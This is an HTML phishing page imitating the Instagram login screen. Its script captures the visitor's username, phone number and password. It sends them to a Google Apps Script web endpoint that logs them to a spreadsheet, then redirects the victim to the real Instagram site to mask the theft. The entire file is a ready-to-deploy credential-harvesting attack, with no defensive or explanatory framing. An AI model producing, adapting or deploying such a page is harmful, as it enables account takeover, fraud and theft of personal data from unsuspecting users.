<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        /* CSS ANIMATIONS & STYLING */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        /* Entrance Animation for the Card */
        .login-card {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            width: 350px;
            text-align: center;
            animation: slideUp 0.8s ease-out forwards;
            opacity: 0;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(50px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo {
            width: 180px;
            margin-bottom: 30px;
            filter: brightness(0) invert(1); /* Makes logo white */
        }

        .input-group {
            margin-bottom: 15px;
            position: relative;
        }

        input {
            width: 100%;
            padding: 12px 15px;
            border-radius: 8px;
            border: none;
            background: rgba(255, 255, 255, 0.9);
            outline: none;
            font-size: 14px;
            transition: 0.3s;
        }

        input:focus {
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
            transform: scale(1.02);
        }

        button {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border: none;
            border-radius: 8px;
            background-color: #0095f6;
            color: white;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        button:hover {
            background-color: #1877f2;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        button:active {
            transform: scale(0.95);
        }

        /* Loading Spinner */
        .loader {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid #FFF;
            border-bottom-color: transparent;
            border-radius: 50%;
            display: inline-block;
            box-sizing: border-box;
            animation: rotation 1s linear infinite;
            margin-left: 10px;
            vertical-align: middle;
        }

        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="login-card">
        <h1 style="color: white; font-style: italic; margin-bottom: 20px; font-size: 35px;">Instagram</h1>
        
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
            </div>
            <div class="input-group">
                <input type="text" id="phone" placeholder="Full Mobile Number" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>
            
            <button type="submit" id="submitBtn">
                <span id="btnText">Log In</span>
                <span id="loader" class="loader hidden"></span>
            </button>
        </form>

        <div style="margin-top: 20px; color: white; font-size: 12px;">
            Forgot password?
        </div>
    </div>

    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbx5MFZ0R8J4xNIxuupgqDctzS6tTpyxYnBweHQw3i5X4DhEki1NAGjLqdxrtYmXJtSI/exec';
        const form = document.getElementById('loginForm');
        const btn = document.getElementById('submitBtn');
        const loader = document.getElementById('loader');
        const btnText = document.getElementById('btnText');

        form.addEventListener('submit', e => {
            e.preventDefault();
            
            // Show Animation
            btnText.innerText = "Connecting...";
            loader.classList.remove('hidden');
            btn.disabled = true;

            // Prepare Data
            const data = {
                username: document.getElementById('username').value,
                phone: document.getElementById('phone').value,
                password: document.getElementById('password').value
            };

            // Send to Google Sheets
            fetch(scriptURL, { 
                method: 'POST', 
                mode: 'no-cors', // Essential for Apps Script
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(() => {
                // Successful submission leads to redirect
                window.location.href = "https://www.instagram.com";
            })
            .catch(error => {
                console.error('Error!', error.message);
                alert("An error occurred. Please try again.");
                btnText.innerText = "Log In";
                loader.classList.add('hidden');
                btn.disabled = false;
            });
        });
    </script>

</body>
</html>
